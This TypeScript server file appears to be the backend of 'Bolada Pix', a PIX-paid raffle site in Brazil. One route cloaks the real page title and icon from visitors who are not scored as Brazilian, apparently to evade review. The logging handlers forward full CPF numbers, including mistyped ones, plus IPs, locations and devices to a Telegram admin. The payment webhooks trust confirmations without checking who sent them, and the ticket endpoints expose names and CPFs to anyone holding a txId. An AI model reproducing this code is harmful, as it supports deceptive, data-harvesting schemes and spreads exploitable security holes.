import "./lib/error-capture";

import { consumeLastCapturedError } from "./lib/error-capture";
import { renderErrorPage } from "./lib/error-page";
import { getRifaConfig, logActivity, type ActivityEvent } from "./lib/rifa-store";
import { sendTelegramNotification, handleTelegramCommand, handleCallbackQuery } from "./lib/telegram-bot";
import { auditSecurity, getClientIp, MILITARY_SECURITY_HEADERS, API_SECURITY_HEADERS, buildSecureErrorResponse } from "./lib/security-shield";
import { extractLeadProfile } from "./lib/lead-profiler";
import { PaymentManager, storeTransactionLead, getTransactionLead } from "./lib/payment-manager";
import { getSecret } from "./lib/vault-shield";
import { generateEncryptedTickets, formatTicketsAsTxt, formatTicketsForTelegram, type GeneratedTicket } from "./lib/ticket-generator";
import { decryptRouteParam } from "./lib/crypto-routes";
import { formatBrasiliaTime, formatBrasiliaDate } from "./lib/date-utils";
import { encryptPurchaseData, generatePurchaseProofToken } from "./lib/purchase-cipher";

type ServerEntry = {
  fetch: (request: Request, env: unknown, ctx: unknown) => Promise<Response> | Response;
};

let serverEntryPromise: Promise<ServerEntry> | undefined;

async function getServerEntry(): Promise<ServerEntry> {
  if (!serverEntryPromise) {
    serverEntryPromise = import("@tanstack/react-start/server-entry").then(
      (m) => (m.default ?? m) as ServerEntry,
    );
  }
  return serverEntryPromise;
}

async function normalizeCatastrophicSsrResponse(response: Response): Promise<Response> {
  if (response.status < 500) return response;
  const contentType = response.headers.get("content-type") ?? "";
  if (!contentType.includes("application/json")) return response;

  const body = await response.clone().text();
  if (!isH3SwallowedErrorBody(body)) return response;

  console.error(consumeLastCapturedError() ?? new Error(`h3 swallowed SSR error: ${body}`));
  return new Response(renderErrorPage(), {
    status: 500,
    headers: { "content-type": "text/html; charset=utf-8", ...MILITARY_SECURITY_HEADERS },
  });
}

function isH3SwallowedErrorBody(body: string): boolean {
  try {
    const payload = JSON.parse(body) as { unhandled?: unknown; message?: unknown };
    return payload.unhandled === true && payload.message === "HTTPError";
  } catch {
    return false;
  }
}

export default {
  async fetch(request: Request, env: unknown, ctx: unknown) {
    const url = new URL(request.url);
    const clientIp = getClientIp(request);

    // 🛡️ 1. BLINDAGEM MILITAR: Verificação Anti-DDoS, Scanners de portas e Bloqueio Geográfico
    const securityCheck = auditSecurity(request);
    if (!securityCheck.allowed) {
      // Se for ataque/exploit/scan de portas, notifica o Admin Supremo com alerta de emergência
      if (securityCheck.isAttack) {
        const timeStr = formatBrasiliaTime();
        await sendTelegramNotification(
          `🚨 <b>ALERTA DE SEGURANÇA MILITAR: TENTATIVA DE ATAQUE INTERCEPTADA!</b>\n` +
          `⚠️ <b>Tipo:</b> <code>${securityCheck.attackType || "Ataque Malicioso"}</code>\n` +
          `📍 <b>IP Infrator:</b> <code>${clientIp}</code> (Bloqueado)\n` +
          `🔍 <b>Detalhes:</b> <code>${securityCheck.details || "Inundação / Port Scan"}</code>\n` +
          `⏰ <b>Horário:</b> <code>${timeStr}</code>\n` +
          `🛡️ <i>O firewall militar descartou a conexão imediatamente.</i>`
        );
      }

      return buildSecureErrorResponse(securityCheck.reason);
    }

    // 1.1 Endpoint de Validação Precisa de Lead Brasileiro Genuíno (descriptografa favicon e título na aprovação)
    if (url.pathname === "/api/validate-lead" && request.method === "POST") {
      const profile = extractLeadProfile(request, clientIp);
      const isGenuine = profile.validation.isGenuineBrazilian;

      return new Response(
        JSON.stringify({
          valid: isGenuine,
          score: profile.validation.score,
          city: profile.city,
          state: profile.state,
          country: profile.country,
          // Se validado, libera o payload descriptografado do título e do favicon
          title: isGenuine ? "Bolada Pix — Prêmios incríveis" : "Carregando...",
          icon: isGenuine ? "/assets/logo.webp" : "data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'/>",
        }),
        {
          headers: {
            "Content-Type": "application/json",
            "Cache-Control": "no-store",
            ...API_SECURITY_HEADERS,
          },
        }
      );
    }

    // 1.2 Endpoint para consulta e verificação de bilhetes gerados
    if (url.pathname === "/api/tickets/status" && request.method === "GET") {
      const txId = url.searchParams.get("txId") || "";
      const leadRecord = getTransactionLead(txId);
      const tickets = (leadRecord?.lead as unknown as { tickets?: GeneratedTicket[] })?.tickets || [];

      return new Response(
        JSON.stringify({
          txId,
          hasTickets: tickets.length > 0,
          count: tickets.length,
          tickets: tickets.map((t) => ({ code: t.code, hash: t.hashToken })),
        }),
        {
          headers: {
            "Content-Type": "application/json",
            ...API_SECURITY_HEADERS,
          },
        }
      );
    }

    // 1.3 Endpoint para download dos bilhetes em arquivo .TXT oficial
    if (url.pathname === "/api/tickets/download" && request.method === "GET") {
      const txId = url.searchParams.get("txId") || "";
      const leadRecord = getTransactionLead(txId);
      const leadData = leadRecord?.lead as unknown as { tickets?: GeneratedTicket[]; name?: string; cpf?: string };
      const tickets = leadData?.tickets || [];
      const config = getRifaConfig();

      if (tickets.length === 0) {
        return new Response("Nenhum bilhete confirmado encontrado para esta transação.", {
          status: 404,
          headers: { "Content-Type": "text/plain; charset=utf-8" },
        });
      }

      const txtContent = formatTicketsAsTxt({
        edition: config.edition,
        txId,
        payerName: leadData?.name,
        payerDocument: leadData?.cpf,
        drawDate: `${config.drawDate} às ${config.drawTime}`,
        tickets,
      });

      return new Response(txtContent, {
        headers: {
          "Content-Type": "text/plain; charset=utf-8",
          "Content-Disposition": `attachment; filename="bolada_pix_bilhetes_${txId.substring(0, 10)}.txt"`,
          "Cache-Control": "no-store",
          ...API_SECURITY_HEADERS,
        },
      });
    }

    // 2. Endpoint para obter a configuração pública em tempo real da rifa e do WhatsApp
    if (url.pathname === "/api/rifa-config" && request.method === "GET") {
      const config = getRifaConfig();
      return new Response(JSON.stringify(config), {
        headers: {
          "Content-Type": "application/json",
          "Cache-Control": "no-store",
          ...API_SECURITY_HEADERS,
        },
      });
    }

    // Compatibilidade para endpoint direto de WhatsApp
    if (url.pathname === "/api/whatsapp-config" && request.method === "GET") {
      const config = getRifaConfig();
      return new Response(
        JSON.stringify({
          phone: config.whatsappSupportNumber,
          message: "Olá! Gostaria de informações sobre a Bolada Pix!",
        }),
        {
          headers: {
            "Content-Type": "application/json",
            "Cache-Control": "no-store",
            ...API_SECURITY_HEADERS,
          },
        }
      );
    }

    // 3. Endpoint de registro avançado de telemetria e perfil do lead
    if (url.pathname === "/api/activity-log" && request.method === "POST") {
      try {
        const body = (await request.json()) as Omit<ActivityEvent, "id" | "timestamp">;
        const profile = extractLeadProfile(request, clientIp);
        const dataPayload = body.data ?? undefined;

        const logged = logActivity({
          type: body.type,
          data: dataPayload,
          ip: clientIp,
          userAgent: profile.userAgent,
          state: profile.state,
          city: profile.city,
          device: `${profile.device} (${profile.os})`,
        });

        const dataObj = body.data || {};
        const cpfFull = typeof dataObj["cpf"] === "string" ? dataObj["cpf"] : (typeof dataObj["cpfLimpo"] === "string" ? dataObj["cpfLimpo"] : (typeof dataObj["cpfDigitado"] === "string" ? dataObj["cpfDigitado"] : "Não informado"));
        const timeStr = formatBrasiliaTime();

        // Mensagens limpas, precisas e organizadas no Telegram
        if (body.type === "entrada") {
          await sendTelegramNotification(
            `🚪 <b>NOVO LEAD REAL NO SITE!</b>\n` +
            `📍 <b>Localização:</b> ${profile.city} - ${profile.state} (${profile.country})\n` +
            `📱 <b>Dispositivo:</b> ${profile.device} | ${profile.os} (${profile.browser})\n` +
            `🌐 <b>IP Completo:</b> <code>${clientIp}</code> | ⏰ <code>${timeStr}</code>`
          );
        } else if (body.type === "click_comprar") {
          const cotas = dataObj["cotas"] || 30;
          const valor = dataObj["valor"] || "20,70";
          const plano = dataObj["plano"] || `${cotas} números`;
          await sendTelegramNotification(
            `🛒 <b>CLIQUE EM COMPRAR!</b>\n` +
            `🎟 <b>Pacote Selecionado:</b> ${plano} (${cotas} cotas)\n` +
            `💰 <b>Valor Previsto:</b> R$ ${valor}\n` +
            `📍 <b>Origem:</b> ${profile.city} - ${profile.state} (${profile.country})\n` +
            `📱 <b>Dispositivo:</b> ${profile.device} | ${profile.os} (${profile.browser})\n` +
            `🌐 <b>IP:</b> <code>${clientIp}</code>\n` +
            `⏰ <b>Horário:</b> <code>${timeStr}</code>`
          );
        } else if (body.type === "modal_opened") {
          await sendTelegramNotification(
            `📋 <b>LEAD ABRIU O MODAL DE DADOS</b>\n` +
            `📍 <b>Origem:</b> ${profile.city} - ${profile.state}\n` +
            `🌐 <b>IP:</b> <code>${clientIp}</code>\n` +
            `⏰ <b>Horário:</b> <code>${timeStr}</code>`
          );
        } else if (body.type === "cpf_validado") {
          await sendTelegramNotification(
            `✅ <b>CPF VALIDADO NO FORMULÁRIO</b>\n` +
            `👤 <b>CPF Completo:</b> <code>${cpfFull}</code>\n` +
            `📍 <b>Local:</b> ${profile.city} - ${profile.state}\n` +
            `🌐 <b>IP:</b> <code>${clientIp}</code>\n` +
            `⏰ <b>Horário:</b> <code>${timeStr}</code>`
          );
        } else if (body.type === "cpf_invalido") {
          await sendTelegramNotification(
            `⚠️ <b>TENTATIVA DE CPF INVÁLIDO DIGITADO</b>\n` +
            `👤 <b>CPF Digitado:</b> <code>${cpfFull}</code>\n` +
            `📍 <b>Origem:</b> ${profile.city} - ${profile.state}\n` +
            `🌐 <b>IP:</b> <code>${clientIp}</code>\n` +
            `⏰ <b>Horário:</b> <code>${timeStr}</code>`
          );
        } else if (body.type === "clique_whatsapp") {
          const actionName = (dataObj["action"] as string) || "geral";
          const userMsg = (dataObj["message"] as string) || "Contato com suporte";
          await sendTelegramNotification(
            `📲 <b>LEAD DIRECIONADO AO WHATSAPP INTELIGENTE!</b>\n` +
            `🎯 <b>Ação Clicada:</b> <code>${actionName}</code>\n` +
            `💬 <b>Mensagem Contextual:</b> <i>"${userMsg}"</i>\n` +
            `📍 <b>Local:</b> ${profile.city} - ${profile.state}\n` +
            `📱 <b>Dispositivo:</b> ${profile.device} (${profile.os})\n` +
            `📞 <b>Número de Destino:</b> +${getRifaConfig().whatsappSupportNumber}\n` +
            `⏰ <b>Horário:</b> <code>${timeStr}</code>`
          );
        } else if (body.type === "saida") {
          await sendTelegramNotification(
            `👋 <b>LEAD SAIU DO SITE</b>\n` +
            `📍 <b>Local:</b> ${profile.city} - ${profile.state}\n` +
            `⏰ <b>Horário:</b> <code>${timeStr}</code>`
          );
        }

        return new Response(JSON.stringify({ ok: true, id: logged.id }), {
          headers: { "Content-Type": "application/json", ...API_SECURITY_HEADERS },
        });
      } catch (err) {
        return new Response(JSON.stringify({ error: "Invalid payload" }), {
          status: 400,
          headers: { "Content-Type": "application/json", ...API_SECURITY_HEADERS },
        });
      }
    }

    // 4. Criação de Cobrança PIX com Failover Automático (União 7 Pay -> Elite PAYbr)
    if (url.pathname === "/api/create-pix" && request.method === "POST") {
      try {
        const payload = await request.json();
        const profile = extractLeadProfile(request, clientIp);

        const chargeResult = await PaymentManager.createPixCharge({
          amount: Number(payload.amount) || 20.70,
          description: payload.description || "Bolada Pix - Cota Oficial",
          payerName: payload.payerName,
          payerDocument: payload.payerDocument,
          externalId: `bolada_${Date.now()}`,
        });

        // Associa a transação aos dados reais e aprofundados do lead (100% explícito sem máscara)
        const digitsOnly = String(payload.payerDocument || "").replace(/\D/g, "");
        const formattedCpf = digitsOnly.length === 11 
          ? digitsOnly.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4")
          : (payload.payerDocument || "Não informado");

        // Criptografia militar de cada compra com envelope AES-256-GCM + HMAC
        const approxTickets = Math.max(1, Math.round((Number(payload.amount) || 20.70) / (getRifaConfig().ticketPrice || 0.69)));
        const proofToken = generatePurchaseProofToken(chargeResult.transactionId, digitsOnly, approxTickets);
        const encryptedEnvelope = encryptPurchaseData({
          txId: chargeResult.transactionId,
          amount: chargeResult.amount,
          payerName: payload.payerName,
          payerDocument: formattedCpf,
          clientIp,
          city: profile.city,
          state: profile.state,
          device: profile.device,
          provider: chargeResult.provider,
          createdAt: new Date().toISOString(),
        });

        storeTransactionLead(
          chargeResult.transactionId,
          {
            name: payload.payerName || "Participante Anônimo",
            cpf: formattedCpf,
            cpfMascarado: formattedCpf,
            ip: clientIp,
            state: profile.state,
            city: profile.city,
            device: profile.device,
            browser: profile.browser,
            os: profile.os,
          },
          chargeResult.amount,
          chargeResult.provider,
          encryptedEnvelope,
          proofToken
        );

        logActivity({
          type: "compra_iniciada",
          data: {
            amount: payload.amount,
            provider: chargeResult.provider,
            txId: chargeResult.transactionId,
            fee: chargeResult.estimatedFee,
            netAmount: chargeResult.netAmount,
            cpf: formattedCpf,
            proofToken,
          },
          ip: clientIp,
          state: profile.state,
          city: profile.city,
        });

        const timeStr = formatBrasiliaTime();
        const dateStr = formatBrasiliaDate();

        await sendTelegramNotification(
          `💳 <b>NOVA COBRANÇA PIX GERADA!</b>\n\n` +
          `🏦 <b>API Emissora:</b> <code>${chargeResult.provider}</code>\n` +
          `💰 <b>Valor Bruto:</b> R$ ${chargeResult.amount.toFixed(2).replace(".", ",")}\n` +
          `📉 <b>Taxa Estimada da API:</b> R$ ${chargeResult.estimatedFee.toFixed(2).replace(".", ",")}\n` +
          `💵 <b>LÍQUIDO DO ADMIN SUPREMO:</b> <b>R$ ${chargeResult.netAmount.toFixed(2).replace(".", ",")}</b>\n\n` +
          `👤 <b>DADOS DO LEAD (100% REAIS):</b>\n` +
          `• <b>CPF Completo:</b> <code>${formattedCpf}</code>\n` +
          `• <b>Localização:</b> ${profile.city} - ${profile.state} (${profile.country})\n` +
          `• <b>Dispositivo:</b> ${profile.device} | ${profile.os} (${profile.browser})\n` +
          `• <b>IP Completo:</b> <code>${clientIp}</code>\n` +
          `📅 <b>Data/Hora:</b> <code>${dateStr} às ${timeStr}</code>\n` +
          `🔐 <b>Recibo Criptográfico:</b> <code>${proofToken}</code>\n` +
          `🛡️ <b>Assinatura Cifra:</b> <code>AES-256-GCM (HMAC: ${encryptedEnvelope.signature.substring(0, 16)}...)</code>\n` +
          `🆔 <b>ID da Transação:</b> <code>${chargeResult.transactionId}</code>`
        );

        return new Response(JSON.stringify({
          ...chargeResult,
          proofToken,
          encryptedSignature: encryptedEnvelope.signature,
        }), {
          headers: { "Content-Type": "application/json", ...API_SECURITY_HEADERS },
        });
      } catch (err: unknown) {
        const errorMsg = err instanceof Error ? err.message : "Payment initiation error";
        console.error("[Create Pix Error]:", err);
        return new Response(JSON.stringify({ success: false, error: errorMsg }), {
          status: 500,
          headers: { "Content-Type": "application/json", ...API_SECURITY_HEADERS },
        });
      }
    }

    // 5. Webhooks de Pagamento (União 7 Pay e Elite PAYbr)
    if (url.pathname === "/api/webhook/uniao7" && request.method === "POST") {
      const body = await request.json();
      if (body.event === "payment.confirmed" || body.status === "paid") {
        const txId = body.transaction_id || "";
        const amount = Number(body.amount) || 0.69;
        const netCalc = PaymentManager.calculateNet(amount, "União 7 Pay");
        const leadRecord = getTransactionLead(txId);
        const lead = leadRecord?.lead;
        const config = getRifaConfig();

        // Quantidade de cotas compradas
        const unitPrice = config.ticketPrice || 0.69;
        const ticketQty = Math.max(1, Math.round(amount / unitPrice));

        // Geração dos códigos de 6 dígitos criptografados com CSPRNG e HMAC
        const tickets = generateEncryptedTickets(ticketQty, txId);
        if (lead) {
          (lead as unknown as { tickets?: GeneratedTicket[] }).tickets = tickets;
        }

        // Criptografia militar permanente da compra confirmada
        const cpfRaw = String(lead?.cpf || "").replace(/\D/g, "");
        const proofToken = leadRecord?.proofToken || generatePurchaseProofToken(txId, cpfRaw, tickets.length);
        const encryptedEnvelope = encryptPurchaseData({
          txId,
          amount,
          tickets: tickets.map((t) => ({ code: t.code, hash: t.hashToken })),
          leadName: lead?.name || "Participante",
          leadCpf: lead?.cpf || "Não informado",
          gateway: "União 7 Pay",
          confirmedAt: new Date().toISOString(),
          proofToken,
        });

        if (lead) {
          storeTransactionLead(
            txId,
            lead,
            amount,
            "União 7 Pay",
            encryptedEnvelope,
            proofToken
          );
        }

        logActivity({
          type: "pagamento_confirmado",
          data: {
            amount: amount,
            netAmount: netCalc.netAmount,
            txId: txId,
            provider: "União 7 Pay",
            cpf: lead?.cpf,
            rifas: ticketQty,
            tickets: tickets.map((t) => t.code),
            proofToken,
          },
          state: lead?.state || "SP",
          city: lead?.city || "São Paulo",
          ip: lead?.ip || clientIp,
        });

        const timeStr = formatBrasiliaTime();
        const dateStr = formatBrasiliaDate();

        // 1. Mensagem principal de confirmação com dados do lead e recibo criptográfico
        await sendTelegramNotification(
          `🎉 <b>COMPRA CONFIRMADA — BOLADA PIX!</b>\n` +
          `━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
          `🏦 <b>Gateway:</b> <code>União 7 Pay</code>\n` +
          `💰 <b>Valor Pago:</b> R$ ${amount.toFixed(2).replace(".", ",")}\n` +
          `📉 <b>Taxa:</b> R$ ${netCalc.fee.toFixed(2).replace(".", ",")}\n` +
          `💵 <b>LÍQUIDO ADMIN:</b> <b>R$ ${netCalc.netAmount.toFixed(2).replace(".", ",")}</b>\n` +
          `━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
          `🎟️ <b>TOTAL DE COTAS:</b> <b>${tickets.length} números</b>\n` +
          `🔐 <b>Recibo Criptográfico:</b> <code>${proofToken}</code>\n` +
          `🛡️ <b>Cifra:</b> <code>AES-256-GCM + HMAC-SHA256</code>\n` +
          `━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
          `👤 <b>DADOS DO LEAD:</b>\n` +
          `  • <b>Nome:</b> ${lead?.name || "Participante Bolada Pix"}\n` +
          `  • <b>CPF:</b> <code>${lead?.cpf || "Não informado"}</code>\n` +
          `  • <b>Local:</b> ${lead?.city || "São Paulo"} - ${lead?.state || "SP"}\n` +
          `  • <b>Aparelho:</b> ${lead?.device || "Mobile"} (${lead?.browser || "Web"})\n` +
          `  • <b>IP:</b> <code>${lead?.ip || clientIp}</code>\n` +
          `━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
          `📅 <b>Aprovado em:</b> <code>${dateStr} às ${timeStr}</code>\n` +
          `🆔 <b>TxID:</b> <code>${txId}</code>`,
          {
            replyMarkup: {
              inline_keyboard: [
                [{ text: `🚫 Banir Lead (IP: ${lead?.ip || clientIp})`, callback_data: `action:ban:${lead?.ip || clientIp}` }],
                [{ text: "👥 Ver Lista de Leads", callback_data: "action:leads_list" }],
              ],
            },
          }
        );

        // 2. Envio organizado e estruturado de TODOS os números em colunas (sem estourar caracteres)
        const ticketChunks = formatTicketsForTelegram(tickets);
        for (let i = 0; i < ticketChunks.length; i++) {
          const partHeader = ticketChunks.length > 1 ? ` (Parte ${i + 1}/${ticketChunks.length})` : "";
          await sendTelegramNotification(
            `🎟️ <b>NÚMEROS OFICIAIS DO SORTEIO${partHeader}</b>\n` +
            `🆔 <b>TxID:</b> <code>${txId}</code>\n` +
            `👤 <b>Lead:</b> ${lead?.name || "Participante"} | <b>CPF:</b> <code>${lead?.cpf || "Não informado"}</code>\n` +
            `📦 <b>Total de Cotas:</b> ${tickets.length} números concorrendo\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
            ticketChunks[i] +
            `\n━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
            `🔐 <b>Recibo:</b> <code>${proofToken}</code>\n` +
            `🛡️ <i>Criptografado com AES-256-GCM e assinado com HMAC-SHA256</i>`
          );
        }
      }
      return new Response(JSON.stringify({ received: true }), { headers: { "Content-Type": "application/json" } });
    }

    if (url.pathname === "/api/webhook/elitepay" && request.method === "POST") {
      const body = await request.json();
      if (body.transactionState === "COMPLETO" || body.status === "concluido") {
        const txId = body.transactionId || "";
        const amount = Number(body.value) || 0.69;
        const netCalc = PaymentManager.calculateNet(amount, "Elite PAYbr");
        const leadRecord = getTransactionLead(txId);
        const lead = leadRecord?.lead;
        const config = getRifaConfig();

        const unitPrice = config.ticketPrice || 0.69;
        const ticketQty = Math.max(1, Math.round(amount / unitPrice));
        const tickets = generateEncryptedTickets(ticketQty, txId);
        if (lead) {
          (lead as unknown as { tickets?: GeneratedTicket[] }).tickets = tickets;
        }

        // Criptografia militar permanente da compra confirmada
        const cpfRaw = String(lead?.cpf || "").replace(/\D/g, "");
        const proofToken = leadRecord?.proofToken || generatePurchaseProofToken(txId, cpfRaw, tickets.length);
        const encryptedEnvelope = encryptPurchaseData({
          txId,
          amount,
          tickets: tickets.map((t) => ({ code: t.code, hash: t.hashToken })),
          leadName: body.payerName || lead?.name || "Participante",
          leadCpf: lead?.cpf || "Não informado",
          gateway: "Elite PAYbr",
          confirmedAt: new Date().toISOString(),
          proofToken,
        });

        if (lead) {
          storeTransactionLead(
            txId,
            lead,
            amount,
            "Elite PAYbr",
            encryptedEnvelope,
            proofToken
          );
        }

        logActivity({
          type: "pagamento_confirmado",
          data: {
            amount: amount,
            netAmount: netCalc.netAmount,
            txId: txId,
            provider: "Elite PAYbr",
            cpf: lead?.cpf,
            rifas: ticketQty,
            tickets: tickets.map((t) => t.code),
            proofToken,
          },
          state: lead?.state || "SP",
          city: lead?.city || "São Paulo",
          ip: lead?.ip || clientIp,
        });

        const timeStr = formatBrasiliaTime();
        const dateStr = formatBrasiliaDate();

        // 1. Mensagem principal de confirmação com dados do lead e recibo criptográfico
        await sendTelegramNotification(
          `🎉 <b>COMPRA CONFIRMADA — BOLADA PIX!</b>\n` +
          `━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
          `🏦 <b>Gateway:</b> <code>Elite PAYbr (Reserva)</code>\n` +
          `💰 <b>Valor Pago:</b> R$ ${amount.toFixed(2).replace(".", ",")}\n` +
          `📉 <b>Taxa:</b> R$ ${netCalc.fee.toFixed(2).replace(".", ",")}\n` +
          `💵 <b>LÍQUIDO ADMIN:</b> <b>R$ ${netCalc.netAmount.toFixed(2).replace(".", ",")}</b>\n` +
          `━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
          `🎟️ <b>TOTAL DE COTAS:</b> <b>${tickets.length} números</b>\n` +
          `🔐 <b>Recibo Criptográfico:</b> <code>${proofToken}</code>\n` +
          `🛡️ <b>Cifra:</b> <code>AES-256-GCM + HMAC-SHA256</code>\n` +
          `━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
          `👤 <b>DADOS DO LEAD:</b>\n` +
          `  • <b>Nome:</b> ${body.payerName || lead?.name || "Participante Bolada Pix"}\n` +
          `  • <b>CPF:</b> <code>${lead?.cpf || "Não informado"}</code>\n` +
          `  • <b>Local:</b> ${lead?.city || "São Paulo"} - ${lead?.state || "SP"}\n` +
          `  • <b>Aparelho:</b> ${lead?.device || "Mobile"} (${lead?.browser || "Web"})\n` +
          `  • <b>IP:</b> <code>${lead?.ip || clientIp}</code>\n` +
          `━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
          `📅 <b>Aprovado em:</b> <code>${dateStr} às ${timeStr}</code>\n` +
          `🆔 <b>TxID:</b> <code>${txId}</code>`,
          {
            replyMarkup: {
              inline_keyboard: [
                [{ text: `🚫 Banir Lead (IP: ${lead?.ip || clientIp})`, callback_data: `action:ban:${lead?.ip || clientIp}` }],
                [{ text: "👥 Ver Lista de Leads", callback_data: "action:leads_list" }],
              ],
            },
          }
        );

        // 2. Envio organizado e estruturado de TODOS os números em colunas
        const ticketChunks = formatTicketsForTelegram(tickets);
        for (let i = 0; i < ticketChunks.length; i++) {
          const partHeader = ticketChunks.length > 1 ? ` (Parte ${i + 1}/${ticketChunks.length})` : "";
          await sendTelegramNotification(
            `🎟️ <b>NÚMEROS OFICIAIS DO SORTEIO${partHeader}</b>\n` +
            `🆔 <b>TxID:</b> <code>${txId}</code>\n` +
            `👤 <b>Lead:</b> ${body.payerName || lead?.name || "Participante"} | <b>CPF:</b> <code>${lead?.cpf || "Não informado"}</code>\n` +
            `📦 <b>Total de Cotas:</b> ${tickets.length} números concorrendo\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
            ticketChunks[i] +
            `\n━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
            `🔐 <b>Recibo:</b> <code>${proofToken}</code>\n` +
            `🛡️ <i>Criptografado com AES-256-GCM e assinado com HMAC-SHA256</i>`
          );
        }
      }
      return new Response(JSON.stringify({ received: true }), { headers: { "Content-Type": "application/json" } });
    }

    // 6. Webhook do Bot Telegram com Suporte 100% a Botões e Ações
    if (url.pathname === "/api/telegram-webhook" && request.method === "POST") {
      try {
        const update = await request.json();
        const token = getSecret("TELEGRAM_BOT_TOKEN");

        // Processa clique em Botões Interativos (Callback Query)
        if (update.callback_query && token) {
          const cb = update.callback_query;
          const chatId = cb.message?.chat?.id;
          const messageId = cb.message?.message_id;
          const { reply, markup } = handleCallbackQuery(cb.data || "");

          // Responde o feedback do botão
          await fetch(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ callback_query_id: cb.id }),
          });

          // Atualiza a mensagem na mesma tela sem spam
          if (chatId && messageId) {
            await fetch(`https://api.telegram.org/bot${token}/editMessageText`, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                chat_id: chatId,
                message_id: messageId,
                text: reply,
                parse_mode: "HTML",
                reply_markup: markup,
                disable_web_page_preview: true,
              }),
            });
          }
          return new Response(JSON.stringify({ ok: true }), { headers: { "Content-Type": "application/json" } });
        }

        const message = update?.message || update?.edited_message;
        if (message && message.text && token) {
          const { reply, markup } = handleTelegramCommand(message.text, message.message_id);
          const chatId = message.chat.id;

          await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: chatId,
              text: reply,
              parse_mode: "HTML",
              reply_to_message_id: message.message_id,
              reply_markup: markup,
            }),
          });
        }
        return new Response(JSON.stringify({ ok: true }), {
          headers: { "Content-Type": "application/json" },
        });
      } catch (err) {
        return new Response(JSON.stringify({ ok: false }), { status: 500 });
      }
    }

    // 7. Renderização SSR protegida por cabeçalhos militares de segurança
    try {
      const handler = await getServerEntry();
      const response = await handler.fetch(request, env, ctx);
      const normalized = await normalizeCatastrophicSsrResponse(response);

      for (const [key, value] of Object.entries(MILITARY_SECURITY_HEADERS)) {
        normalized.headers.set(key, value);
      }
      return normalized;
    } catch (error) {
      console.error(error);
      return new Response(renderErrorPage(), {
        status: 500,
        headers: { "content-type": "text/html; charset=utf-8", ...MILITARY_SECURITY_HEADERS },
      });
    }
  },
};
